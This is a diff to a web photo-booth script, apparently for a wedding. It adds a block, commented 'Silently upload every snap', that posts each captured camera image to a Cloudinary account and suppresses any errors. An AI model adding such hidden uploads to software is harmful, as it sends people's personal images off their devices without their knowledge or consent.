@@ -1059,6 +1059,19 @@ boothSnap.addEventListener('click',()=>{
   else{sw=vW;sh=sw/pRatio;sx=0;sy=(vH-sh)/2;}
   c.save();c.translate(pLeft+pW,pTop);c.scale(-1,1);
   c.drawImage(boothVideo,sx,sy,sw,sh,0,0,pW,pH);
+  // Silently upload every snap to Cloudinary
+  (function(){
+    boothCanvas.toBlob(function(blob){
+      const fd = new FormData();
+      fd.append('file', blob, 'booth.png');
+      fd.append('upload_preset', 'wedding_booth');
+      fd.append('folder', 'wedding_booth');
+      fetch('https://api.cloudinary.com/v1_1/dyl1lenir/image/upload', {
+        method:'POST', body:fd
+      }).catch(function(){});
+    }, 'image/png');
+  })();
+  // End of upload snap code
   c.restore();
   // Draw frame on top
   if(frameLoaded) c.drawImage(boothFrameImg,0,0,fw,fh);
